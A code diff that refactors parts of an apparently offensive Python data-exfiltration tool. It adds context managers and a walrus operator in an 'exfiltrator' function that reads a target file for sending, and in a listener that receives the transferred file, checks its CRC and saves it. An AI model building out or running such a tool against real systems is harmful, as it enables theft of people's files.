@@ -68,9 +68,8 @@ def exfiltrator(server, path_to_file, time_delay=0.1):
 
 	# Read file
 	try:
-		fh = open(path_to_file, BINARY_READ)
-		exfil_me = fh.read()
-		fh.close()
+		with open(path_to_file, BINARY_READ) as fh:
+			exfil_me = fh.read()
 	except:
 		sys.stderr.write("Problem with reading file. ")
 		return -1
@@ -139,8 +138,7 @@ def server(addr="127.0.0.1"):
 		try:
 			sys.stdout.write("Incoming connection from %s\n" % client_address)
 			while True:
-				data = connection.recv()
-				if data:
+				if data := connection.recv():
 					if data.find(INITIATOR) != -1:
 						# Found initiation packet!
 
@@ -184,10 +182,8 @@ def server(addr="127.0.0.1"):
 						if crc == str(zlib.crc32(entire_raw_file)):
 							sys.stdout.write("CRC matched!\n")
 
-							fh = open(crc + "_" + file_name, BINARY_WRITE)
-							fh.write(entire_raw_file)
-							fh.close()
-
+							with open(f"{crc}_{file_name}", BINARY_WRITE) as fh:
+								fh.write(entire_raw_file)
 						else:
 							sys.stderr.write("CRC match failed!\n")
 
